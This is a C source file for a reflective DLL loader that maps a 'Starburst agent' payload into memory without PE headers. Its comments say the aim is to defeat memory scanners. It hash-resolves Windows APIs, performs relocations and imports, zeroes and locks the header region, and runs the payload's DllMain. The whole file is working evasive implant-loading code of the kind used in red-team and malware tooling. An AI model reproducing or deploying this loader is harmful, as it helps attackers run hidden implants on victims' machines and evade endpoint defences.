#include <Common.h>
#include <Constexpr.h>
#include <UserData.h>

/*
 * Starburst UDRL - Headerless Reflective DLL Loader
 *
 * Loads the Starburst agent DLL without placing PE headers in the mapped
 * memory region. Sections are mapped at their normal virtual addresses,
 * then the header region is zeroed. No MZ/PE signature exists at the
 * allocation base, defeating memory scanners that walk allocation bases
 * looking for DOS/NT header signatures.
 *
 * This example replaces loader/src/Main.c. It reuses the same Stardust
 * framework and build system as the base loader.
 */

/* PE section characteristics to memory protection */
FUNC static DWORD SectionToProtect( DWORD ch ) {
    BOOL x = !!( ch & IMAGE_SCN_MEM_EXECUTE );
    BOOL r = !!( ch & IMAGE_SCN_MEM_READ    );
    BOOL w = !!( ch & IMAGE_SCN_MEM_WRITE   );

    if ( x && w && r ) return PAGE_EXECUTE_READWRITE;
    if ( x && r      ) return PAGE_EXECUTE_READ;
    if ( x && w      ) return PAGE_EXECUTE_WRITECOPY;
    if ( x           ) return PAGE_EXECUTE;
    if ( w && r      ) return PAGE_READWRITE;
    if ( r           ) return PAGE_READONLY;
    if ( w           ) return PAGE_WRITECOPY;
    return PAGE_NOACCESS;
}

/* Generate pseudo-random RC4 key from RDTSC */
FUNC static VOID GenerateRc4Key( PBYTE Key ) {
    for ( int i = 0; i < 16; i += 4 ) {
        DWORD tick;
#ifdef _WIN64
        tick = (DWORD)__rdtsc();
#else
        tick = (DWORD)__rdtsc();
#endif
        Key[i]     = (BYTE)( tick );
        Key[i + 1] = (BYTE)( tick >> 8 );
        Key[i + 2] = (BYTE)( tick >> 16 );
        Key[i + 3] = (BYTE)( tick >> 24 );
        for ( volatile int j = 0; j < 100; j++ ) {}
    }
}

/*
 * Main - Headerless reflective loader entry point.
 *
 * Param: pointer to the raw DLL payload buffer (set by the caller/stub).
 *        The first 4 bytes are the DLL size, followed by the raw PE bytes.
 *        If Param is NULL, the loader looks for the payload appended after
 *        its own image (StRipEnd).
 */
FUNC VOID Main(
    _In_ PVOID Param
) {
    STARDUST_INSTANCE

    /* ── Resolve APIs ── */

    if ( ! ( Instance()->Modules.Kernel32 = LdrModulePeb( H_MODULE_KERNEL32 ) ) )
        return;
    if ( ! ( Instance()->Modules.Ntdll = LdrModulePeb( H_MODULE_NTDLL ) ) )
        return;

    Instance()->Win32.LoadLibraryA           = LdrFunction( Instance()->Modules.Kernel32, HASH_STR( "LoadLibraryA"           ) );
    Instance()->Win32.LoadLibraryExW         = LdrFunction( Instance()->Modules.Kernel32, HASH_STR( "LoadLibraryExW"         ) );
    Instance()->Win32.GetProcAddress          = LdrFunction( Instance()->Modules.Kernel32, HASH_STR( "GetProcAddress"          ) );
    Instance()->Win32.VirtualAlloc            = LdrFunction( Instance()->Modules.Kernel32, HASH_STR( "VirtualAlloc"            ) );
    Instance()->Win32.VirtualProtect          = LdrFunction( Instance()->Modules.Kernel32, HASH_STR( "VirtualProtect"          ) );
    Instance()->Win32.VirtualFree             = LdrFunction( Instance()->Modules.Kernel32, HASH_STR( "VirtualFree"             ) );
    Instance()->Win32.NtFlushInstructionCache = LdrFunction( Instance()->Modules.Ntdll,    HASH_STR( "NtFlushInstructionCache" ) );

    if ( ! Instance()->Win32.LoadLibraryA    || ! Instance()->Win32.GetProcAddress ||
         ! Instance()->Win32.VirtualAlloc    || ! Instance()->Win32.VirtualProtect ||
         ! Instance()->Win32.NtFlushInstructionCache )
        return;

    /* ── Locate DLL payload ── */

    PBYTE DllRaw   = NULL;
    DWORD DllSize  = 0;

    if ( Param ) {
        DllSize = *(PDWORD) Param;
        DllRaw  = (PBYTE) Param + 4;
    } else {
        PBYTE End = (PBYTE) StRipEnd();
        DllSize = *(PDWORD) End;
        DllRaw  = End + 4;
    }

    if ( ! DllRaw || DllSize < sizeof(IMAGE_DOS_HEADER) )
        return;

    /* ── Parse PE headers from the raw buffer ── */

    PIMAGE_DOS_HEADER Dos = C_PTR( DllRaw );
    if ( Dos->e_magic != IMAGE_DOS_SIGNATURE )
        return;

    PIMAGE_NT_HEADERS Nt = C_PTR( DllRaw + Dos->e_lfanew );
    if ( Nt->Signature != IMAGE_NT_SIGNATURE )
        return;

    DWORD     ImageSize     = Nt->OptionalHeader.SizeOfImage;
    DWORD     HeadersSize   = Nt->OptionalHeader.SizeOfHeaders;
    ULONGLONG PreferredBase = Nt->OptionalHeader.ImageBase;
    WORD      NumSections   = Nt->FileHeader.NumberOfSections;
    DWORD     EntryRva      = Nt->OptionalHeader.AddressOfEntryPoint;

    /* Save relocation directory info before we lose access to mapped headers */
    DWORD RelocRva  = Nt->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_BASERELOC ].VirtualAddress;
    DWORD RelocSize = Nt->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_BASERELOC ].Size;

    /* Save import directory info */
    DWORD ImportRva = Nt->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_IMPORT ].VirtualAddress;

    PIMAGE_SECTION_HEADER Sections = IMAGE_FIRST_SECTION( Nt );

    /* ── Allocate target memory ── */

    PBYTE MappedBase = Instance()->Win32.VirtualAlloc(
        NULL, ImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
    if ( ! MappedBase ) return;

    /* ── Map PE sections (skip headers) ── */

    for ( WORD i = 0; i < NumSections; i++ ) {
        if ( Sections[i].SizeOfRawData == 0 )
            continue;
        MmCopy(
            MappedBase + Sections[i].VirtualAddress,
            DllRaw     + Sections[i].PointerToRawData,
            Sections[i].SizeOfRawData
        );
    }

    /* The header region at MappedBase is never written. VirtualAlloc
     * zero-fills committed pages, so no MZ/PE signature exists there. */

    /* ── Process relocations (using saved directory from raw buffer) ── */

    LONGLONG Delta = (LONGLONG)( (ULONGLONG)MappedBase - PreferredBase );

    if ( Delta != 0 && RelocRva && RelocSize ) {
        PIMAGE_BASE_RELOCATION Reloc = C_PTR( MappedBase + RelocRva );
        PBYTE RelocEnd = (PBYTE)Reloc + RelocSize;

        while ( (PBYTE)Reloc < RelocEnd && Reloc->SizeOfBlock ) {
            DWORD Count = ( Reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION) ) / sizeof(WORD);
            PWORD Entries = (PWORD)( (PBYTE)Reloc + sizeof(IMAGE_BASE_RELOCATION) );

            for ( DWORD i = 0; i < Count; i++ ) {
                WORD Type   = Entries[i] >> 12;
                WORD Offset = Entries[i] & 0xFFF;
                PBYTE Patch = MappedBase + Reloc->VirtualAddress + Offset;

                switch ( Type ) {
                    case IMAGE_REL_BASED_DIR64:
                        *(PULONGLONG)Patch += Delta;
                        break;
                    case IMAGE_REL_BASED_HIGHLOW:
                        *(PDWORD)Patch += (DWORD)Delta;
                        break;
                    case IMAGE_REL_BASED_HIGH:
                        *(PWORD)Patch += (WORD)( Delta >> 16 );
                        break;
                    case IMAGE_REL_BASED_LOW:
                        *(PWORD)Patch += (WORD)Delta;
                        break;
                    case IMAGE_REL_BASED_ABSOLUTE:
                        break;
                }
            }
            Reloc = C_PTR( (PBYTE)Reloc + Reloc->SizeOfBlock );
        }
    }

    /* ── Resolve imports (using saved directory from raw buffer) ── */

    if ( ImportRva ) {
        PIMAGE_IMPORT_DESCRIPTOR Imp = C_PTR( MappedBase + ImportRva );

        while ( Imp->Name ) {
            PCHAR ModName = C_PTR( MappedBase + Imp->Name );
            HMODULE hMod  = Instance()->Win32.LoadLibraryA( ModName );

            if ( ! hMod ) { Imp++; continue; }

            PIMAGE_THUNK_DATA OrigThunk = C_PTR(
                MappedBase + ( Imp->OriginalFirstThunk ? Imp->OriginalFirstThunk : Imp->FirstThunk ) );
            PIMAGE_THUNK_DATA IatThunk  = C_PTR( MappedBase + Imp->FirstThunk );

            while ( OrigThunk->u1.AddressOfData ) {
                FARPROC Func = NULL;

#ifdef _WIN64
                if ( OrigThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG64 )
                    Func = Instance()->Win32.GetProcAddress( hMod, (LPCSTR)( OrigThunk->u1.Ordinal & 0xFFFF ) );
#else
                if ( OrigThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG32 )
                    Func = Instance()->Win32.GetProcAddress( hMod, (LPCSTR)( OrigThunk->u1.Ordinal & 0xFFFF ) );
#endif
                else {
                    PIMAGE_IMPORT_BY_NAME ImpName = C_PTR( MappedBase + OrigThunk->u1.AddressOfData );
                    Func = Instance()->Win32.GetProcAddress( hMod, ImpName->Name );
                }

                IatThunk->u1.Function = (ULONGLONG)Func;
                OrigThunk++;
                IatThunk++;
            }
            Imp++;
        }
    }

    /* ── Set section protections (header page set to PAGE_NOACCESS) ── */

    /* Read section headers from the raw buffer since we never mapped them */
    Sections = IMAGE_FIRST_SECTION( C_PTR( DllRaw + ((PIMAGE_DOS_HEADER)DllRaw)->e_lfanew ) );

    for ( WORD i = 0; i < NumSections; i++ ) {
        if ( Sections[i].Misc.VirtualSize == 0 )
            continue;
        DWORD Prot = SectionToProtect( Sections[i].Characteristics );
        DWORD Old;
        Instance()->Win32.VirtualProtect(
            MappedBase + Sections[i].VirtualAddress,
            Sections[i].Misc.VirtualSize,
            Prot, &Old );
    }

    /* Header region has no PE data. Mark it inaccessible. */
    { DWORD Old; Instance()->Win32.VirtualProtect( MappedBase, HeadersSize, PAGE_NOACCESS, &Old ); }

    /* ── Flush instruction cache ── */

    Instance()->Win32.NtFlushInstructionCache( (HANDLE)-1, MappedBase, ImageSize );

    /* ── Populate UDRL_USER_DATA ── */

    UDRL_USER_DATA *Ud = Instance()->Win32.VirtualAlloc(
        NULL, sizeof(UDRL_USER_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );

    if ( Ud ) {
        MmZero( Ud, sizeof(UDRL_USER_DATA) );
        Ud->magic     = UDRL_MAGIC;
        Ud->load_type = LOAD_TYPE_VIRTUAL_ALLOC;

        Ud->agent_base  = MappedBase;
        Ud->agent_size  = ImageSize;
        Ud->loader_base = Instance()->Base.Buffer;
        Ud->loader_size = Instance()->Base.Length;

        Ud->regions[0].base    = MappedBase;
        Ud->regions[0].size    = ImageSize;
        Ud->regions[0].protect = PAGE_EXECUTE_READ;
        Ud->region_count = 1;

        GenerateRc4Key( Ud->rc4_key );
    }

    /* ── Call DllMain ── */

    typedef BOOL (WINAPI *fnDllMain)( HINSTANCE, DWORD, LPVOID );

    if ( EntryRva ) {
        fnDllMain pDllMain = C_PTR( MappedBase + EntryRva );
        pDllMain( (HINSTANCE)MappedBase, DLL_PROCESS_ATTACH, (LPVOID)Ud );
    }
}
